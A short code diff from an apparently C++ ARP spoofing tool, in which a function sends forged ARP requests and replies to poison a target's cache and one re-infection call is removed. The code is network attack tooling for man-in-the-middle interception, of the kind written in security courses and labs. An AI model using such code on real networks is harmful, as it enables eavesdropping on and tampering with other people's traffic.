@@ -293,7 +293,6 @@ void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP, MyAddr attacker)
     ARPinfect(handle,attacker.mac_,Mac::broadcastMac(),ArpHdr::Request,attacker.mac_,attacker.ip_,Mac::nullMac(),tIP);
     Mac tMAC = getMACAddr(handle, tIP);
     ARPinfect(handle,attacker.mac_,sMAC,ArpHdr::Reply,attacker.mac_,sIP,tMAC,tIP);
-    ARPreInfect(handle,tIP,sIP,attacker);
 
 
     ARPreInfect(handle,sIP,tIP,attacker);
